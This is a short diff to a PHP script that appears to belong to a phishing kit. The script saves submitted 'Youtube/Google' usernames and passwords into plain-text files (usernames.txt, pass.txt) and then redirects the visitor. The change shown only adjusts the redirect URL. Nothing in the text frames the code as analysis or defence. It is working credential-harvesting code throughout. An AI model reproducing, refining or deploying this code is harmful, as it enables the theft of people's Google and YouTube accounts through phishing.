@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "Youtube/Google Username : " . $email = $_POS
 ?>
 <?php
 file_put_contents("pass.txt", "Youtube/Google password : " . $pswrepeat = $_POST['pswrepeat'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
